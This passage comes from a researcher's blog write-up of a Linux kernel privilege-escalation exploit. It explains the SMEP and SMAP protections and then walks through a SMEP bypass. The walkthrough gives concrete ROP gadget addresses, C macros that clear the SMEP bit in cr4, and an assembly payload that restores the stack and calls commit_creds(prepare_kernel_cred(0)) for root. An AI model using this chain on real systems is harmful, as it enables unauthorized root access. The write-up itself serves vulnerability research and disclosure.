<p>SMAP and SMEP are both CPU features which require support on the kernel side.
Which basically means that each of them is enabled only if:</p>

<ol>
  <li>The CPU supports it</li>
  <li>The kernel supports it</li>
  <li>It’s enabled in the kernel configuration</li>
</ol>

<p>The kernel has SMEP support since v3.0 and SMAP support since v3.7 and they are both usually enabled in the modern distributions.
However, while Intel’s CPU received the SMEP support a few years ago (since the Ivy Bridge architecture), the SMAP support was added quite recently (starting from the Broadwell architecture) and therefore not many CPUs out there have it.</p>

<p>If you take a close look at the exploitation process I described above, you can see that both SMEP and SMAP will protect from the code execution.
SMEP will detect that we execute code from the userspace when the <code class="language-plaintext highlighter-rouge">callback</code> is called and SMAP will detect that <code class="language-plaintext highlighter-rouge">ubuf_info</code> is being accessed from the userspace.</p>

<p>Another existing Linux kernel hardening technique is <a href="https://lwn.net/Articles/569635/">KASLR</a> (Kernel Address-Space Layout Randomization).
The kernel supports it starting from v3.14, but at the moment it’s disabled by default in most modern distributions.</p>

<h3 id="smep-bypass"><a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://xairy.io/articles/2016/cve-2016-2384#smep-bypass" style="font-style: normal; font-variant: normal; font-weight: normal; font-stretch: normal; font-size: 1em; line-height: inherit; font-family: anchorjs-icons; position: absolute; margin-left: -1em; padding-right: 0.5em;"></a>SMEP bypass</h3>

<p>I’m going to show how to bypass SMEP and make the exploitation possible on many modern CPUs with modern kernels.
The classic way to do it is to use in-kernel ROP (<a href="https://en.wikipedia.org/wiki/Return-oriented_programming">Return-Oriented Programming</a>) and that’s what we’re going to do.
If you’re not familiar with ROP, I suggest reading up it on somewhere (there are many tutorials available).
Here I’m going to assume that our CPU has x86-64 architecture.</p>

<p>Overall, I’m going to use a <code class="language-plaintext highlighter-rouge">xchg eax, esp</code> gadget to set stack pointer to a particular address in the userspace to control the stack, disable SMEP via ROP, restore stack pointer and then jump to a <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(0))</code> payload, which resides in the userspace memory.
Let’s go through it step by step.</p>

<p>First, let’s take a look at the disassembly around the code that calls the <code class="language-plaintext highlighter-rouge">callback</code>:</p>

<pre><code class="language-asm">                if (uarg-&gt;callback)
ffffffff816c39b9:       48 8b 07                mov    (%rdi),%rax
ffffffff816c39bc:       48 85 c0                test   %rax,%rax
ffffffff816c39bf:       74 07                   je     ffffffff816c39c8 &lt;skb_release_data+0x98&gt;
                        uarg-&gt;callback(uarg, true);
ffffffff816c39c1:       be 01 00 00 00          mov    $0x1,%esi
ffffffff816c39c6:       ff d0                   callq  *%rax
</code></pre>

<p>As we can see, the address of the <code class="language-plaintext highlighter-rouge">callback</code> is stored in the <code class="language-plaintext highlighter-rouge">rax</code> register and then <code class="language-plaintext highlighter-rouge">callq</code> is used to call it.
Let’s imagine that the <code class="language-plaintext highlighter-rouge">callback</code> contains the address of the <code class="language-plaintext highlighter-rouge">xchg eax, esp ; ret</code> gadget.
In that case after <code class="language-plaintext highlighter-rouge">callq *%rax</code> this gadget will get executed.
It will swap the values of <code class="language-plaintext highlighter-rouge">eax</code> and <code class="language-plaintext highlighter-rouge">esp</code> and at the same time zero out the higher 32 bits of <code class="language-plaintext highlighter-rouge">rax</code> and <code class="language-plaintext highlighter-rouge">rsp</code> (see <a href="https://stackoverflow.com/questions/11177137/why-do-most-x64-instructions-zero-the-upper-part-of-a-32-bit-register">this</a> for details).
Therefore, if the gadget address is <code class="language-plaintext highlighter-rouge">0xffffffff8100008a</code> then the new <code class="language-plaintext highlighter-rouge">rsp</code> value will be <code class="language-plaintext highlighter-rouge">0x000000008100008a</code>, which is a userspace address.
If we <code class="language-plaintext highlighter-rouge">mmap()</code> this address in advance, we will get control of the stack.
As a side note, our fake stack will reside in the userspace, and that’s another thing that SMAP will detect.</p>

<p>Now we can put our ROP payload into this stack and we’re good.
There’s an issue though.
Suppose our ROP payload got executed.
After that we need a way to restore the stack pointer back to it’s original value and return to where the <code class="language-plaintext highlighter-rouge">callback</code> was called from.
We can’t just do <code class="language-plaintext highlighter-rouge">xchg eax, esp</code> again, since after the first <code class="language-plaintext highlighter-rouge">xchg</code> we lost the higher 32 bits of the original <code class="language-plaintext highlighter-rouge">rsp</code> value.</p>

<p>However, there’s a way to restore these 32 bits.
If you think about it, <code class="language-plaintext highlighter-rouge">rbp</code> has a very close value to <code class="language-plaintext highlighter-rouge">rsp</code>, since <code class="language-plaintext highlighter-rouge">rsp</code> is saved into <code class="language-plaintext highlighter-rouge">rbp</code> in each function’s prologue, and the chances that they have the same higher 32 bits are insanely high.
So we can just use the higher 32 bits of <code class="language-plaintext highlighter-rouge">rbp</code> as the higher 32 bits of <code class="language-plaintext highlighter-rouge">rsp</code> and the <code class="language-plaintext highlighter-rouge">eax</code> value after the <code class="language-plaintext highlighter-rouge">xchg</code> instruction as the lower 32 bits of <code class="language-plaintext highlighter-rouge">rsp</code>.
We better save the <code class="language-plaintext highlighter-rouge">eax</code> value right after the <code class="language-plaintext highlighter-rouge">xchg</code>, so we can use the <code class="language-plaintext highlighter-rouge">rax</code> register in the ROP payload.
That’s no problem, we can just save it into some userspace address with the first few ROP gadgets in the payload.
That’s actually another place where we access the userspace, which can be detected by SMAP.</p>

<p>I used the following ROP gadgets to save the <code class="language-plaintext highlighter-rouge">eax</code> value:</p>

<pre><code class="language-asm">0xffffffff8118991d : pop rdi ; ret
0xffffffff810fff17 : mov dword ptr [rdi], eax ; ret
</code></pre>

<p>So the first part of the payload looks like:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define POP_RDI_RET               0xffffffff8118991dL
#define MOV_DWORD_PTR_RDI_EAX_RET 0xffffffff810fff17L
</span>
<span class="cp">#define CHAIN_SAVE_EAX                  \
  *stack++ = POP_RDI_RET;               \
  *stack++ = (uint64_t)&amp;saved_eax;      \
  *stack++ = MOV_DWORD_PTR_RDI_EAX_RET;
</span></code></pre></div></div>

<p>Now, that we have the <code class="language-plaintext highlighter-rouge">eax</code> saved, we can do something more useful.
For instance disable SMEP.
Whether SMEP if enabled or not is controlled by the 20th bit of the <code class="language-plaintext highlighter-rouge">cr4</code> register.
There are a few gadgets in the kernel which allow us to set the <code class="language-plaintext highlighter-rouge">cr4</code> value.
I used these:</p>

<pre><code class="language-asm">0xffffffff8118991d : pop rdi ; ret
0xffffffff8105b8f0 : push rbp ; mov rbp, rsp ; mov cr4, rdi ; pop rbp ; ret
</code></pre>

<p>Note, that the second gadget also pushes and then pops back the <code class="language-plaintext highlighter-rouge">rbp</code> register.
If we omit the <code class="language-plaintext highlighter-rouge">push</code>, then we will end up with garbage in <code class="language-plaintext highlighter-rouge">rbp</code>.</p>

<p>As a result, the next part of the payload looks like:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define POP_RDI_RET               0xffffffff8118991dL
#define MOV_CR4_RDI_RET           0xffffffff8105b8f0L
#define CR4_DESIRED_VALUE         0x407f0
</span>
<span class="cp">#define CHAIN_SET_CR4                   \
  *stack++ = POP_RDI_RET;               \
  *stack++ = CR4_DESIRED_VALUE;         \
  *stack++ = MOV_CR4_RDI_RET;           
</span></code></pre></div></div>

<p>Now that we disabled SMEP, we can jump to a userspace payload, so we wouldn’t need to mess around with ROP anymore.
Here are the gadgets the I used:</p>

<pre><code class="language-asm">0xffffffff810053bc : pop rcx ; ret
0xffffffff81040a90 : jmp rcx
</code></pre>

<p>And here is the last part of the ROP payload:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define POP_RCX_RET               0xffffffff810053bcL
#define JMP_RCX                   0xffffffff81040a90L
</span>
<span class="cp">#define CHAIN_JMP_PAYLOAD               \
  *stack++ = POP_RCX_RET;               \
  *stack++ = (uint64_t)&amp;payload;        \
  *stack++ = JMP_RCX;                   \
</span></code></pre></div></div>

<p>We can write the userspace payload in assembly, which is much easier than doing ROP.
Here’s the payload that I used:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Unfortunately GCC does not support `__atribute__((naked))` on x86, which</span>
<span class="c1">// can be used to omit a function's prologue, so I had to use this weird</span>
<span class="c1">// wrapper hack as a workaround. Note: Clang does support it, which means it</span>
<span class="c1">// has better support of GCC attributes than GCC itself. Funny.</span>
<span class="kt">void</span> <span class="nf">wrapper</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">asm</span> <span class="k">volatile</span> <span class="p">(</span><span class="s">"                         </span><span class="se">\n</span><span class="s">\
    payload:                              </span><span class="se">\n</span><span class="s">\
      movq %%rbp, %%rax                   </span><span class="se">\n</span><span class="s">\
      movq $0xffffffff00000000, %%rdx     </span><span class="se">\n</span><span class="s">\
      andq %%rdx, %%rax                   </span><span class="se">\n</span><span class="s">\
      movq %0, %%rdx                      </span><span class="se">\n</span><span class="s">\
      addq %%rdx, %%rax                   </span><span class="se">\n</span><span class="s">\
      movq %%rax, %%rsp                   </span><span class="se">\n</span><span class="s">\
      jmp get_root                        </span><span class="se">\n</span><span class="s">\
  "</span> <span class="o">:</span> <span class="o">:</span> <span class="s">"m"</span><span class="p">(</span><span class="n">saved_eax</span><span class="p">)</span> <span class="o">:</span> <span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">payload</span><span class="p">();</span>
</code></pre></div></div>

<p>The payload first restores <code class="language-plaintext highlighter-rouge">rsp</code> using <code class="language-plaintext highlighter-rouge">rbp</code> and the saved <code class="language-plaintext highlighter-rouge">eax</code> and then jumps to a <code class="language-plaintext highlighter-rouge">get_root()</code> payload, which does <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(0))</code>.
There’s a reason why the <code class="language-plaintext highlighter-rouge">rsp</code> value is restored first.
That’s because the current kernel thread can easily get rescheduled during <code class="language-plaintext highlighter-rouge">get_root()</code> by the kernel and, since the structure that describes a kernel thread is stored at the end of it’s stack, the kernel won’t find it there and will crash.</p>

<p>After the <code class="language-plaintext highlighter-rouge">get_root()</code> payload gets executed, the kernel returns to where the <code class="language-plaintext highlighter-rouge">payload</code> was called from, since the last return address was put by <code class="language-plaintext highlighter-rouge">callq *%rax</code> on the original stack.
And that’s it. We have successfully bypassed SMEP and got root privileges.
<a href="https://www.youtube.com/watch?v=lfl1NJn1nvo">Here</a> is a demo video.
Woohoo!</p>

<p>I used <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> to extract the gadgets.
All of the used gadgets seem to be present in all of the stock kernel binaries I looked at (except for <code class="language-plaintext highlighter-rouge">jmp rcx</code>, but it’s easily replaceable).
Note, that gadgets shouldn’t be extracted from the <code class="language-plaintext highlighter-rouge">.init.text</code> section of a kernel binary, since the code from there gets overwritten after the kernel is done booting.</p>

<p>Initially I was looking for something like <code class="language-plaintext highlighter-rouge">xchg rax, rsp</code>, so I wouldn’t need to mess around with restoring <code class="language-plaintext highlighter-rouge">rsp</code> that much, but it seems that this kind of gadgets is not present in the kernel binaries.</p>

<p>Due to the fact, that slab objects are sometimes cached in a per-cpu list, it’s better to run a few instances of the binary.
The number is better to be equal or greater then the number of the CPU cores.
In that case it’s highly probable that at least one of the binaries will be scheduled on the same CPU that performs the probing and therefore allocate per-cpu cached objects.</p>

<h2 id="links"><a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://xairy.io/articles/2016/cve-2016-2384#links" style="font-style: normal; font-variant: normal; font-weight: normal; font-stretch: normal; font-size: 1em; line-height: inherit; font-family: anchorjs-icons; position: absolute; margin-left: -1em; padding-right: 0.5em;"></a>Links</h2>

<p>A set of links to talks about various USB attacks and fuzzing:</p>

<ul>
  <li><a href="https://www.youtube.com/watch?v=nuruzFqMgIw">BadUSB</a></li>
  <li><a href="https://www.youtube.com/watch?v=KWOTXypBt4E">Introduction to USB and Fuzzing</a></li>
  <li><a href="https://www.youtube.com/watch?v=90MIjgh5ESU">USB Attacks Need Physical Access Right? Not Any More…</a></li>
  <li><a href="https://www.youtube.com/watch?v=OAbzN8k6Am4">Don’t trust your USB</a></li>
  <li><a href="https://www.youtube.com/watch?v=UWOxzfRUwis">USB Attack to Decrypt Wi Fi Communications</a></li>
</ul>

  </div><a class="u-url" href="https://xairy.io/articles/2016/cve-2016-2384" hidden=""></a>
</article>

      </div>
    </main><footer id="site-footer" class="site-footer h-card" style="background-color: rgb(239, 237, 222);">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">Andrey Konovalov</li><li><a class="u-email" href="mailto:andreyknvl@gmail.com">andreyknvl@gmail.com</a></li><li><a class="u-email" href="https://xairy.io/pgp">PGP key</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.twitter.com/andreyknvl"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">andreyknvl</span></a></li><li><a href="https://github.com/xairy"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">xairy</span></a></li><li><a href="https://www.linkedin.com/in/xairy"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#linkedin"></use></svg> <span class="username">xairy</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Linux kernel • Binary exploitation • Hardware hacking</p>
      </div>
    </div>

  </div>

</footer>



</body></html>